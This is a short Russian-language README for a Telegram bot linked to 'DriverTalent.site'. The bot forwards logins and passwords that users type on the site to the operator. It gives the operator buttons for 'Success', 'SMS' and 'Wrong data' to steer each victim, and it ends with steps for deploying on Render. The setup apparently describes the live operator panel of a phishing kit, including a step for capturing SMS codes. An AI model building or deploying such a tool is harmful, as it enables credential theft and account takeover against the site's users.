# Telegram Bot для DriverTalent.site

Этот бот принимает логин и пароль, введенные пользователем на сайте, и отображает кнопки управления в Telegram.

## Что делает бот:
- Получает POST-запрос с данными (`login`, `password`) с сайта
- Отправляет их вам в Telegram
- Показывает кнопки: ✅ Успех, ✉️ SMS, ❌ Неверные данные
- При нажатии "Неверные данные" бот может инициировать повторный ввод

## Деплой на Render
1. Загрузите код на GitHub
2. Создайте Web Service на https://render.com
3. Укажите Build Command: `pip install -r requirements.txt`
4. Start Command: `python bot.py`
